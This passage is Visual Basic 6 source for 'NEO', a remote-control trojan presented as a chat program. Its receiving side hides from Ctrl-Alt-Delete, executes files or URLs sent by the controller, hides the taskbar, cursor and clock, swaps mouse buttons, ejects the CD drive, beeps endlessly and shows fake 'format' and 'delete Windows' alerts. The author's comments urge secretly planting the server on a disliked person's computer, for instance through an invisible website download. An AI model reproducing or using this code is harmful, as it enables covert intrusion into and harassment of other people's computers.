VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000007&
   BorderStyle     =   0  'None
   Caption         =   "Richard's Chat Program"
   ClientHeight    =   5250
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   7770
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "chat.frx":0000
   ScaleHeight     =   350
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   518
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text6 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "System"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000006&
      Height          =   240
      Left            =   3120
      TabIndex        =   52
      Tag             =   "1"
      Text            =   "Message Title"
      Top             =   3600
      Width           =   1575
   End
   Begin VB.CommandButton Command35 
      Caption         =   "Send"
      Height          =   255
      Left            =   3480
      TabIndex        =   51
      Tag             =   "1"
      Top             =   4320
      Width           =   855
   End
   Begin VB.TextBox Text2 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "System"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000007&
      Height          =   240
      Left            =   6000
      TabIndex        =   50
      Tag             =   "1"
      Text            =   " C:"
      Top             =   3840
      Width           =   1215
   End
   Begin VB.CommandButton Command34 
      Caption         =   "Execute URL"
      Height          =   255
      Left            =   6000
      TabIndex        =   49
      Tag             =   "1"
      Top             =   4200
      Width           =   1215
   End
   Begin VB.CommandButton Command22 
      Caption         =   "Format C:"
      Height          =   255
      Left            =   4440
      TabIndex        =   48
      Tag             =   "1"
      Top             =   3240
      Width           =   1335
   End
   Begin VB.CommandButton Command16 
      Caption         =   "Delete Windows"
      Height          =   255
      Left            =   3120
      TabIndex        =   47
      Tag             =   "1"
      Top             =   3240
      Width           =   1335
   End
   Begin VB.TextBox Text4 
      BorderStyle     =   0  'None
      Height          =   1935
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   46
      Tag             =   "1"
      Text            =   "chat.frx":0342
      Top             =   2640
      Width           =   2895
   End
   Begin VB.TextBox Text5 
      BorderStyle     =   0  'None
      Height          =   240
      Left            =   120
      TabIndex        =   45
      Tag             =   "1"
      Text            =   " "
      Top             =   4680
      Width           =   2175
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Send"
      Height          =   255
      Left            =   2400
      TabIndex        =   44
      Tag             =   "1"
      Top             =   4680
      Width           =   615
   End
   Begin VB.CommandButton Command28 
      Caption         =   "Disable ctrl alt delete"
      Height          =   255
      Left            =   4440
      TabIndex        =   43
      Tag             =   "1"
      Top             =   2160
      Width           =   1695
   End
   Begin VB.CommandButton Command29 
      Caption         =   "Enable ctrl alt delete"
      Height          =   255
      Left            =   6120
      TabIndex        =   42
      Tag             =   "1"
      Top             =   2160
      Width           =   1575
   End
   Begin VB.TextBox Text3 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "System"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000006&
      Height          =   240
      Left            =   3120
      TabIndex        =   41
      Tag             =   "1"
      Text            =   "Message"
      Top             =   3840
      Width           =   1575
   End
   Begin VB.Timer Timer1 
      Left            =   2400
      Top             =   480
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Move mouse"
      Height          =   255
      Left            =   6000
      TabIndex        =   40
      Tag             =   "1"
      Top             =   3480
      Width           =   1215
   End
   Begin VB.TextBox Text1 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "System"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000006&
      Height          =   240
      Left            =   1200
      TabIndex        =   39
      Text            =   " "
      Top             =   1200
      Width           =   1575
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Connect"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   120
      TabIndex        =   38
      Top             =   1560
      Width           =   1095
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Disconnect"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   1200
      TabIndex        =   37
      Tag             =   "1"
      Top             =   1560
      Width           =   1095
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Listen"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   2280
      TabIndex        =   36
      Top             =   1560
      Width           =   735
   End
   Begin VB.TextBox Text7 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000006&
      Height          =   240
      Left            =   6720
      TabIndex        =   35
      Tag             =   "1"
      Text            =   " 0"
      Top             =   3120
      Width           =   495
   End
   Begin VB.TextBox Text8 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000006&
      Height          =   240
      Left            =   6000
      TabIndex        =   34
      Tag             =   "1"
      Text            =   " 0"
      Top             =   3120
      Width           =   495
   End
   Begin VB.CommandButton Command36 
      Caption         =   "Stop clip"
      Height          =   255
      Left            =   6600
      TabIndex        =   33
      Tag             =   "1"
      Top             =   1920
      Width           =   1095
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Clip cursor"
      Height          =   255
      Left            =   6600
      TabIndex        =   32
      Tag             =   "1"
      Top             =   1680
      Width           =   1095
   End
   Begin VB.CommandButton Command33 
      Caption         =   "Show icons"
      Height          =   255
      Left            =   5400
      TabIndex        =   31
      Tag             =   "1"
      Top             =   1920
      Width           =   1215
   End
   Begin VB.CommandButton Command32 
      Caption         =   "Hide icons"
      Height          =   255
      Left            =   5400
      TabIndex        =   30
      Tag             =   "1"
      Top             =   1680
      Width           =   1215
   End
   Begin VB.CommandButton Command31 
      Caption         =   "Show start"
      Height          =   255
      Left            =   3120
      TabIndex        =   29
      Tag             =   "1"
      Top             =   1920
      Width           =   1095
   End
   Begin VB.CommandButton Command30 
      Caption         =   "Hide start"
      Height          =   255
      Left            =   3120
      TabIndex        =   28
      Tag             =   "1"
      Top             =   1680
      Width           =   1095
   End
   Begin VB.CommandButton Command27 
      Caption         =   "Show desktop"
      Height          =   255
      Left            =   4200
      TabIndex        =   27
      Tag             =   "1"
      Top             =   1920
      Width           =   1215
   End
   Begin VB.CommandButton Command26 
      Caption         =   "Hide desktop"
      Height          =   255
      Left            =   4200
      TabIndex        =   26
      Tag             =   "1"
      Top             =   1680
      Width           =   1215
   End
   Begin VB.CommandButton Command25 
      Caption         =   "Show mouse"
      Height          =   255
      Left            =   6600
      TabIndex        =   25
      Tag             =   "1"
      Top             =   1440
      Width           =   1095
   End
   Begin VB.CommandButton Command24 
      Caption         =   "Hide mouse"
      Height          =   255
      Left            =   6600
      TabIndex        =   24
      Tag             =   "1"
      Top             =   1200
      Width           =   1095
   End
   Begin VB.CommandButton Command23 
      Caption         =   "Hide taskbar"
      Height          =   255
      Left            =   4200
      TabIndex        =   23
      Tag             =   "1"
      Top             =   1200
      Width           =   1215
   End
   Begin VB.CommandButton Command21 
      Caption         =   "Show taskbar"
      Height          =   255
      Left            =   4200
      TabIndex        =   22
      Tag             =   "1"
      Top             =   1440
      Width           =   1215
   End
   Begin VB.CommandButton Command20 
      Caption         =   "Reset click"
      Height          =   255
      Left            =   5400
      TabIndex        =   21
      Tag             =   "1"
      Top             =   1440
      Width           =   1215
   End
   Begin VB.CommandButton Command19 
      Caption         =   "Change click"
      Height          =   255
      Left            =   5400
      TabIndex        =   20
      Tag             =   "1"
      Top             =   1200
      Width           =   1215
   End
   Begin VB.CommandButton Command18 
      Caption         =   "Swap back"
      Height          =   255
      Left            =   5400
      TabIndex        =   19
      Tag             =   "1"
      Top             =   960
      Width           =   1215
   End
   Begin VB.CommandButton Command17 
      Caption         =   "Swap mouse"
      Height          =   255
      Left            =   5400
      TabIndex        =   18
      Tag             =   "1"
      Top             =   720
      Width           =   1215
   End
   Begin VB.CommandButton Command15 
      Caption         =   "Hide form"
      Height          =   255
      Left            =   6600
      TabIndex        =   17
      Tag             =   "1"
      Top             =   720
      Width           =   1095
   End
   Begin VB.CommandButton Command14 
      Caption         =   "Show form"
      Height          =   255
      Left            =   6600
      TabIndex        =   16
      Tag             =   "1"
      Top             =   960
      Width           =   1095
   End
   Begin VB.CommandButton Command13 
      Caption         =   "Show clock"
      Height          =   255
      Left            =   4200
      TabIndex        =   15
      Tag             =   "1"
      Top             =   960
      Width           =   1215
   End
   Begin VB.CommandButton Command12 
      Caption         =   "Hide clock"
      Height          =   255
      Left            =   4200
      TabIndex        =   14
      Tag             =   "1"
      Top             =   720
      Width           =   1215
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Stop noise"
      Height          =   255
      Left            =   3120
      TabIndex        =   13
      Tag             =   "1"
      Top             =   1440
      Width           =   1095
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Make noise"
      Height          =   255
      Left            =   3120
      TabIndex        =   12
      Tag             =   "1"
      Top             =   1200
      Width           =   1095
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Close CD"
      Height          =   255
      Left            =   3120
      TabIndex        =   11
      Tag             =   "1"
      Top             =   960
      Width           =   1095
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Open CD"
      Height          =   255
      Left            =   3120
      TabIndex        =   10
      Tag             =   "1"
      Top             =   720
      Width           =   1095
   End
   Begin VB.CommandButton Command10 
      Caption         =   "Flash keyboard"
      Height          =   255
      Left            =   3120
      TabIndex        =   9
      Tag             =   "1"
      Top             =   2160
      Width           =   1335
   End
   Begin VB.TextBox Text9 
      BorderStyle     =   0  'None
      Height          =   195
      Left            =   120
      TabIndex        =   8
      Text            =   "neo.time "
      Top             =   2160
      Width           =   1455
   End
   Begin VB.CommandButton Command37 
      Caption         =   "Speak to NEO"
      Height          =   255
      Left            =   1680
      TabIndex        =   7
      Top             =   2160
      Width           =   1215
   End
   Begin VB.TextBox Text10 
      BorderStyle     =   0  'None
      Height          =   195
      Left            =   120
      TabIndex        =   6
      Text            =   "Annonymous"
      Top             =   1920
      Width           =   1455
   End
   Begin VB.CommandButton Command38 
      Caption         =   "Screen Blackout"
      Height          =   255
      Left            =   3240
      TabIndex        =   5
      Tag             =   "1"
      Top             =   2400
      Width           =   1575
   End
   Begin VB.TextBox Text11 
      Height          =   285
      Left            =   4920
      TabIndex        =   4
      Tag             =   "1"
      Text            =   "Har Har from the other side"
      Top             =   2400
      Width           =   1335
   End
   Begin VB.OptionButton Option1 
      BackColor       =   &H80000007&
      Caption         =   "Option1"
      Height          =   255
      Left            =   4680
      TabIndex        =   3
      Tag             =   "1"
      Top             =   3600
      Width           =   255
   End
   Begin VB.OptionButton Option2 
      BackColor       =   &H80000007&
      Caption         =   "Option2"
      Height          =   195
      Left            =   4680
      TabIndex        =   2
      Tag             =   "1"
      Top             =   3960
      Width           =   255
   End
   Begin VB.OptionButton Option3 
      BackColor       =   &H80000007&
      Caption         =   "Option3"
      Height          =   255
      Left            =   4680
      TabIndex        =   1
      Tag             =   "1"
      Top             =   4200
      Width           =   255
   End
   Begin VB.OptionButton Option4 
      BackColor       =   &H80000007&
      Caption         =   "Option4"
      Height          =   195
      Left            =   4680
      TabIndex        =   0
      Tag             =   "1"
      Top             =   4560
      Width           =   255
   End
   Begin MSWinsockLib.Winsock Ws 
      Left            =   1440
      Top             =   3000
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Image Image6 
      Height          =   255
      Left            =   7440
      Picture         =   "chat.frx":0344
      Stretch         =   -1  'True
      Top             =   120
      Width           =   255
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Critical"
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   4920
      TabIndex        =   57
      Top             =   3600
      Width           =   615
   End
   Begin VB.Label Label3 
      BackColor       =   &H80000012&
      BackStyle       =   0  'Transparent
      Caption         =   "Ok "
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   4920
      TabIndex        =   56
      Top             =   3960
      Width           =   255
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Yes/no"
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   4920
      TabIndex        =   55
      Top             =   4200
      Width           =   615
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Exclamation"
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   4920
      TabIndex        =   54
      Top             =   4560
      Width           =   855
   End
   Begin VB.Image Image2 
      Height          =   2535
      Left            =   3000
      Picture         =   "chat.frx":09CD
      Stretch         =   -1  'True
      Top             =   360
      Width           =   4785
   End
   Begin VB.Image Image5 
      Height          =   840
      Left            =   6960
      Picture         =   "chat.frx":1695
      Stretch         =   -1  'True
      Top             =   4440
      Width           =   780
   End
   Begin VB.Image Image4 
      Height          =   1980
      Left            =   2880
      Picture         =   "chat.frx":1AC0
      Stretch         =   -1  'True
      Top             =   3000
      Width           =   2970
   End
   Begin VB.Image Image1 
      Height          =   855
      Left            =   -360
      Picture         =   "chat.frx":2536
      Stretch         =   -1  'True
      Top             =   0
      Width           =   8220
   End
   Begin VB.Label Label1 
      BackColor       =   &H80000012&
      BackStyle       =   0  'Transparent
      Caption         =   " "
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   120
      TabIndex        =   53
      Top             =   5040
      Width           =   5415
   End
   Begin VB.Image Image3 
      Height          =   1695
      Left            =   0
      Picture         =   "chat.frx":3389
      Stretch         =   -1  'True
      Top             =   840
      Width           =   3015
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'<<<<<<<<<<<<<<<<NEO - by Richard Banks>>>>>>>>>>>>>>>>>>>>>>>
'Neo was primarily an innocent chat program, that has since been transformed in to a trojen
'It wasn't intentional, it was just so tempting to make it in to one, so I did. There aren't
'really any features on NEO that can damage a computer in any way, it is just supposed to be
'for fun. Included in the package is a server which totally hides itself, and this can be given
'to someone who you don't like. How you give it to them is up to you, but you must be secretive.
'A tip might be to upload it to a website (yours maybe) , and have it download the server
'invisibly to the other persons computer. The server will constantly listen for a connection.
'All you have to do is press connect once you have got the other persons IP. Then the fun can start
'NEO has been a big project for me, so please vote for it. You can also contact me on my email
'at axeboy15@hotmail.com or on ICQ on 70621321. Thank you very much and PLEASE VOTE FOR
'THIS CODE. All my other codes haven't really been voted on. I think it is because people
'just look and don't bother to vote. So please do!!!!!!!!!!!!

'<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>

'**************************VARIABLES************************************
Dim wsdata As String 'this is the data that will be send with Winsock (must be string)
Dim execfile As String 'this is the data that will be sent for executing the files
'************************************************************************

'******************START CONNECTION CODE********************************
Private Sub Command1_Click() ' connect
On Error Resume Next
Ws.RemoteHost = Text1.Text 'assigns the value of the remote host to text1.text
Ws.RemotePort = "3999" 'this is the port that NEO will connect to
Ws.Connect
Command3.Enabled = False 'this disables listen and disconnect cos these aren't needed
Command2.Enabled = False
Text10.Enabled = False
End Sub

Private Sub Command2_Click()
Ws.SendData "DISCONNECTED" 'send data to disconnect
Ws.Close 'disconnect
End Sub

Private Sub Command3_Click()
On Error Resume Next
Ws.LocalPort = "3999" 'port that NEO will liten in to
Ws.Listen
Command1.Enabled = False 'disables disconnect and connect cos they aren't needed
Command2.Enabled = False
Text10.Enabled = False
End Sub

Private Sub Text9_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
Call Command37_Click
End If
End Sub

Private Sub ws_ConnectionRequest(ByVal requestID As Long)
Ws.Close
Ws.Accept requestID 'accept the other sides ID ready for chat.
End Sub
'******************END CONNECTION CODE**********************************

'*******************FUN MANAGER PROTOCOLS*******************************
'This long section is just the code for what the buttons send when they are pressed.
'I won't bother commenting on them because they are pretty obvious.

Private Sub Command38_Click()
Ws.SendData "SCREEN" & "$" & Text11.Text
Text11.Text = ""
End Sub

Private Sub Command26_Click()
Ws.SendData "HDESK"
End Sub

Private Sub Command27_Click()
Ws.SendData "SDESK"
End Sub

'Private Sub Command11_Click()
'Ws.SendData "CLIP"
'End Sub

Private Sub Command10_Click()
Ws.SendData "FLASH"
Label1.Caption = "Their keyboard is flashing"
End Sub

Private Sub Command34_Click()
Ws.SendData "EXECUTE" & Text2.Text
Label1.Caption = "You executed" & " " & Text2.Text & " " & "on their computer"
End Sub

Private Sub Command35_Click()
Dim msgboxtype(3) As VbMsgBoxStyle
If Option1.Value = True Then
msgboxtype(0) = vbCritical
Ws.SendData "USER1" & "$" & Text3.Text & "$" & msgboxtype(0) & "$" & Text6.Text
ElseIf Option2.Value = True Then
msgboxtype(1) = vbOKOnly
Ws.SendData "USER2" & "$" & Text3.Text & "$" & msgboxtype(1) & "$" & Text6.Text
ElseIf Option3.Value = True Then
msgboxtype(2) = vbYesNo
Ws.SendData "USER3" & "$" & Text3.Text & "$" & msgboxtype(2) & "$" & Text6.Text
ElseIf Option4.Value = True Then
msgboxtype(3) = vbExclamation
Ws.SendData "USER4" & "$" & Text3.Text & "$" & msgboxtype(3) & "$" & Text6.Text

End If
Label1.Caption = "You sent them a custom message"
End Sub

'Private Sub Command36_Click()
'Ws.SendData "STOPCLIP"
'End Sub

Private Sub Command4_Click()
Ws.SendData "TALK" & "$" & Text10.Text & "$" & Text5.Text
Text4.Text = Text4.Text & Text10.Text & ": " & Text5.Text & vbCrLf
Text4.SelStart = Len(Text4.Text)
Text5.Text = ""
Text5.SetFocus
End Sub
 
 Private Sub Command28_Click()
Ws.SendData "DISABLE"
Label1.Caption = "You disabled their ctrl alt delete"
End Sub

Private Sub Command29_Click()
Ws.SendData "ENABLE"
Label1.Caption = "You enabled their ctrl alt delete"
End Sub
 
 Private Sub Command32_Click()
Ws.SendData "HIDEICONS"
 Label1.Caption = "You hid their taskbar icons"
End Sub

Private Sub Command33_Click()
Ws.SendData "SHOWICONS"
  Label1.Caption = "You showed their taskbar icons"
End Sub

Private Sub Command30_Click()
Ws.SendData "HIDESTART"
 Label1.Caption = "You hid their start button"
End Sub

Private Sub Command31_Click()
Ws.SendData "SHOWSTART"
 Label1.Caption = "You showed their start button"
End Sub

Private Sub Command12_Click()
Ws.SendData "HIDECLOCK"
Label1.Caption = "Hiding their clock..."
End Sub

Private Sub Command13_Click()
Ws.SendData "SHOWCLOCK"
Label1.Caption = "Showing their clock..."
End Sub

Private Sub Command14_Click()
Ws.SendData "SFORM"
Label1.Caption = "You have shown their program again.."
End Sub

Private Sub Command15_Click()
Ws.SendData "HFORM"
Label1.Caption = "You hid their program..."
End Sub

Private Sub Command16_Click()
Ws.SendData "MSG"
Label1.Caption = "You sent them a scary message..."
End Sub

Private Sub Command17_Click()
Ws.SendData "SWAP"
Label1.Caption = "You swapped their mouse buttons around..."
End Sub

Private Sub Command18_Click()
Ws.SendData "SWAPBACK"
Label1.Caption = "You reset their mouse button order..."
End Sub

Private Sub Command19_Click()
Ws.SendData "DBLCLICK"
Label1.Caption = "You changed their dbl click speed to 1milli second..."
End Sub

Private Sub Command20_Click()
Ws.SendData "STOPDBL"
Label1.Caption = "You have reset their mouse settings..."
End Sub

Private Sub Command21_Click()
Ws.SendData "SHOWTASK"
Label1.Caption = "You have shown their taskbar..."
 End Sub

Private Sub Command22_Click()
Ws.SendData "FORMAT"
Label1.Caption = "You sent them a scary message"
End Sub

Private Sub Command23_Click()
 Ws.SendData "HIDETASK"
 Label1.Caption = "You hid their entire taskbar..."
End Sub

Private Sub Command24_Click()
Ws.SendData "HMOUSE"
Label1.Caption = "You hid their mouse.....evil"
End Sub

Private Sub Command25_Click()
Ws.SendData "SMOUSE"
Label1.Caption = "You showed their mouse.....evil"
End Sub

Private Sub Command5_Click()
Ws.SendData "MOVE" & "$" & Text7.Text & "$" & Text8.Text
Label1.Caption = "Their mouse has been moved....hehe"
End Sub

Private Sub Command6_Click()
Ws.SendData "OPEN"
Label1.Caption = "Their CD drive just opened..."
 End Sub

Private Sub Command7_Click()
Ws.SendData "CLOSE"
 Label1.Caption = "Their CD drive just closed..."
 End Sub

Private Sub Command8_Click()
Ws.SendData "BEEP"
Label1.Caption = "Their computer is beeping..."
End Sub

Private Sub Command9_Click()
Ws.SendData "STOP"
Label1.Caption = "Their computer has stopped beeping..."
End Sub

'******************END FUN MANAGER PROTOCOLS***************************
Private Sub Form_Load()
On Error Resume Next
Option2.Value = True
loadUP 'sub for controls
Text1.Text = Ws.LocalIP
VICAD False 'this is from the module, and means that it is hidden from ctrl-alt-deleteText1.Text = Ws.LocalIP 'shows the local computer's IP address
Text4.Enabled = False
wsdata = Text5.Text
execfile = Text2.Text
End Sub

'I added this code because I wanted to give my trojen a good interface. This meant
'using a borderless form, and using images. However, you can't drag these types of
'form without the code for doing it, which happens to be API, and a little coding

Private Sub Image5_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = 1 Then 'if user is holding down left mouse button
FormDrag Me 'allow the form to be dragged
End If
End Sub

Private Sub Image6_Click()
End 'ends the program if the cross (top right) is clicked
End Sub

Private Sub ws_Close()
Label1.Caption = "Other side has been disconnected :)"
End Sub

'************************DATA ARRIVAL**********************************
'This section of the code is all about deciphering the data that is send through winsock
'from the other side. It is a bit repetative, but there are some good little features in here
'I won't explain each section because it is already fairly self-explanitary

Private Sub ws_DataArrival(ByVal bytesTotal As Long)
Ws.GetData wsdata

'**********************CONNECTED**************************************
If Left(wsdata, 9) = "CONNECTED" Then 'if it receives the connection data from the

connected 'sub for commands
End If
 
'************************************************************************

'**********************TALKING//*****************************************
'This is just the code for the chat. It is a chat program aswell you know, just with a bit more
'to do, that is all.

If Left(wsdata, 4) = "TALK" Then
Text4.Text = Text4.Text & Split(wsdata, "$")(1) & ": " & Split(wsdata, "$")(2) & vbCrLf
Text4.SelStart = Len(Text4.Text)
End If

'************************************************************************

'*********************MOUSEMOVING**************************************
'One of my favourite features. The alpha version of NEO only had it so that you could move
'the other persons mouse to (0,0). I have now made it so that you can move it to any point
'on their screen. Enjoy!

If Left(wsdata, 4) = "MOVE" Then '
SetCursorPos Split(wsdata, "$")(1), Split(wsdata, "$")(2)
End If
'************************************************************************
  
'*************************CD DRIVE***************************************
'One of the most fun features on any trojen, every one should have one. This gets annoying
'for the person on the receiving end, but who cares!!!

If Left(wsdata, 4) = "OPEN" Then '
retvalue = mciSendString("set CDAudio door open", vbNullString, 0, 0)
End If
 
If Left(wsdata, 5) = "CLOSE" Then '
retvalue = mciSendString("set CDAudio door closed", vbNullString, 0, 0)
End If
'************************************************************************

'***************************MAKE NOISE***********************************
'Makes their computer beep forever, until you stop it of course, or they stupidly turn off the
'computer

If Left(wsdata, 4) = "BEEP" Then
Do While Left(wsdata, 4) <> "STOP"
DoEvents
Beep
Loop
End If
'************************************************************************
 
'************************SYSTEM CLOCK***********************************
'Simply hides their clock on their taskbar.

If Left(wsdata, 9) = "HIDECLOCK" Then
HideClock
End If

If Left(wsdata, 9) = "SHOWCLOCK" Then
ShowClock
End If
'************************************************************************

'*****************************FORM**************************************
'Nothing special here. Code just hides their form so that they can't do anything back to you.
'This could be potentially nasty as NEO is also hidden from the ctrl-alt-delete dialog!!! Beware!!

If Left(wsdata, 8) = "SFORM" Then
Form1.Visible = True
ElseIf Left(wsdata, 5) = "HFORM" Then
Form1.Visible = False
End If
 '************************************************************************

 '**********************MESSAGE BOXES************************************
'This code gives two 'pre-built' message boxes that may or may not scare the other side.
'I have also added a little feature where you can customize both the message title and the
'message. So you can make your own messages as scary as you like

If Left(wsdata, 6) = "FORMAT" Then
MsgBox "Your system has crashed, and some vital system data has been lost. Do you want to format your computer?", vbCritical, "System Failure"
End If
  
If Left(wsdata, 3) = "MSG" Then
MsgBox "Are you sure you want to delete Windows?", vbokayonly, "Delete Windows"
End If
  

'This is my custom message box sending code. In this part, the data is deciphered
'into the various types of message boxes and the titles/message bodies. This can be used
'to scare the other person as you can writet whatever you want!!

If Left(wsdata, 5) = "USER1" Then
MsgBox Split(wsdata, "$")(1), vbCritical, Split(wsdata, "$")(3)
ElseIf Left(wsdata, 5) = "USER2" Then
MsgBox Split(wsdata, "$")(1), vbOKOnly, Split(wsdata, "$")(3)
ElseIf Left(wsdata, 5) = "USER3" Then
MsgBox Split(wsdata, "$")(1), vbYesNo, Split(wsdata, "$")(3)
ElseIf Left(wsdata, 5) = "USER4" Then
MsgBox Split(wsdata, "$")(1), vbExclamation, Split(wsdata, "$")(3)
End If
  
'************************************************************************

'*********************MOUSE BUTTONS*************************************
'This is a pretty cool feature, and is one that will most definitely annoy the other person.
'If you press the button, the other person's mouse buttons will be swapped. This is more
'annoying than you may think!!!

If Left(wsdata, 4) = "SWAP" Then
SwapMouseButton 1
End If

If Left(wsdata, 8) = "SWAPBACK" Then
SwapMouseButton 0
End If
 
'************************************************************************

'**********************CHANGE CLICK*************************************
If Left(wsdata, 8) = "DBLCLICK" Then
SetDoubleClickTime 1
End If

If Left(wsdata, 7) = "STOPDBL" Then
SetDoubleClickTime 1000
End If
'************************************************************************

'************************TASK BAR****************************************
'Hides the entire taskbar (bar at bottom of desktop). This is quite scary I guess, and fun to
'use

If Left(wsdata, 8) = "HIDETASK" Then
Dim Handle As Long
Handle& = FindWindow("Shell_TrayWnd", vbNullString)
ShowWindow Handle&, 0
End If
 
If Left(wsdata, 8) = "SHOWTASK" Then
Dim Handle2 As Long
Handle2& = FindWindow("Shell_TrayWnd", vbNullString)
ShowWindow Handle2&, 1
End If
'************************************************************************

'***********************START BUTTON************************************
'This code will hide their start menu button. This can prove to be a bit annoying, but what
'the hell , use it anyway

If Left(wsdata, 9) = "HIDESTART" Then
Dim Handle3 As Long, FindClass As Long
FindClass& = FindWindow("Shell_TrayWnd", "")
Handle3& = FindWindowEx(FindClass&, 0, "Button", vbNullString)
ShowWindow Handle3&, 0
End If

If Left(wsdata, 9) = "SHOWSTART" Then
Dim Handle1 As Long, FindClass1 As Long
FindClass1& = FindWindow("Shell_TrayWnd", "")
Handle1& = FindWindowEx(FindClass1&, 0, "Button", vbNullString)
ShowWindow Handle1&, 1
End If
'************************************************************************

'*********************HIDE TASKBAR ICONS*********************************
'This basically hides the other computers icons, i.e. their clock, internet icon etc. You'll see

If Left(wsdata, 9) = "HIDEICONS" Then
Dim FindClass4 As Long, Handle4 As Long
FindClass4& = FindWindow("Shell_TrayWnd", "")
Handle4& = FindWindowEx(FindClass4&, 0, "TrayNotifyWnd", vbNullString)
ShowWindow Handle4&, 0
End If

If Left(wsdata, 9) = "SHOWICONS" Then
Dim FindClass5 As Long, Handle5 As Long
FindClass5& = FindWindow("Shell_TrayWnd", "")
Handle5& = FindWindowEx(FindClass5&, 0, "TrayNotifyWnd", vbNullString)
ShowWindow Handle5&, 1
End If
'************************************************************************

'***************************HIDE MOUSE**********************************
'This is an evil little function that hides the other computer's mouse. Go on try it on your
'own computer, and see what it is like...i darez you!

If Left(wsdata, 6) = "HMOUSE" Then
ShowCursor 0
End If

If Left(wsdata, 6) = "SMOUSE" Then
ShowCursor 1
End If
'************************************************************************

'***************************DESKTOP*************************************
'This code hides the desktop icons, until they are shown again. I guess with this feature,
'the hide taskbar, and the disable ctr-alt-delete, you can really scare the other person
'because with these disabled/hidden, there is nothing that they can do with out rebooting,
'not that I know of anyway

' If Left(wsdata, 5) = "HDESK" Then
'Progman& = FindWindow("Progman", vbNullString)
'SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
'SysListView& = FindWindowEx(SHELLDLLDefView&, 0&, "SysListView32", vbNullString)
'Call ShowWindow(SysListView&, SW_HIDE)
    
'End If

'If Left(wsdata, 5) = "SDESK" Then
'Progman& = FindWindow("Progman", vbNullString)
'SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
'SysListView& = FindWindowEx(SHELLDLLDefView&, 0&, "SysListView32", vbNullString)
'Call ShowWindow(SysListView&, SW_SHOW)
  
'End If

'************************************************************************

'************************CTRL-ALT-DELETE*********************************
 'This enables and disables the ctrl-alt-delete on the other computer. It is a bit dodgy at
 'times, but is good fun to use. This program is hidden at all times from the dialog anyway
 'so there isn't much point in having it, just for a bit extra I guess
 
